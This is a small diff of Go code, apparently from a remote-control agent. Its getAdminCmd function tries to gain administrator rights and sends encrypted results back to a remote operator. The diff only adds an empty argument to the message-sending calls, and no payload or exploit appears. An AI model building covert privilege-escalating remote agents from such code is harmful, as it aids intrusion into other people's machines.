@@ -40,7 +40,7 @@ func getAdminCmd(sendUserId, decData string) {
 			message := fmt.Sprintf("%v", err)
 			data := colorcode.OutputMessage(colorcode.SIGN_FAIL, message)
 			outputMsg, _ := crypto.Encrypt([]byte(data), []byte(config.AesKey))
-			common.SendFailMsg(sendUserId, common.ClientId, "getAdmin_ret", outputMsg)
+			common.SendFailMsg(sendUserId, common.ClientId, "getAdmin_ret", outputMsg, "")
 			return
 		}
 		args := strings.Join(os.Args[1:], " ")
@@ -63,7 +63,7 @@ func getAdminCmd(sendUserId, decData string) {
 				message := fmt.Sprintf("failed to obtain administrator privileges: %v", err)
 				data := colorcode.OutputMessage(colorcode.SIGN_FAIL, message)
 				outputMsg, _ := crypto.Encrypt([]byte(data), []byte(config.AesKey))
-				common.SendFailMsg(sendUserId, common.ClientId, "getAdmin_ret", outputMsg)
+				common.SendFailMsg(sendUserId, common.ClientId, "getAdmin_ret", outputMsg, "")
 				return
 			}
 		}
@@ -78,7 +78,7 @@ func getAdminCmd(sendUserId, decData string) {
 			message := fmt.Sprintf("failed to open output files: %v", err)
 			data := colorcode.OutputMessage(colorcode.SIGN_FAIL, message)
 			outputMsg, _ := crypto.Encrypt([]byte(data), []byte(config.AesKey))
-			common.SendFailMsg(sendUserId, common.ClientId, "getAdmin_ret", outputMsg)
+			common.SendFailMsg(sendUserId, common.ClientId, "getAdmin_ret", outputMsg, "")
 			return
 		}
 		defer f.Close()
@@ -92,7 +92,7 @@ func getAdminCmd(sendUserId, decData string) {
 					message := fmt.Sprintf("failed to read output files: %v", err)
 					data := colorcode.OutputMessage(colorcode.SIGN_FAIL, message)
 					outputMsg, _ := crypto.Encrypt([]byte(data), []byte(config.AesKey))
-					common.SendFailMsg(sendUserId, common.ClientId, "getAdmin_ret", outputMsg)
+					common.SendFailMsg(sendUserId, common.ClientId, "getAdmin_ret", outputMsg, "")
 					return
 				}
 			}
@@ -101,5 +101,5 @@ func getAdminCmd(sendUserId, decData string) {
 	}
 
 	outputMsg, _ := crypto.Encrypt([]byte(outData), []byte(config.AesKey))
-	common.SendSuccessMsg(sendUserId, common.ClientId, "getAdmin_ret", outputMsg)
+	common.SendSuccessMsg(sendUserId, common.ClientId, "getAdmin_ret", outputMsg, "")
 }
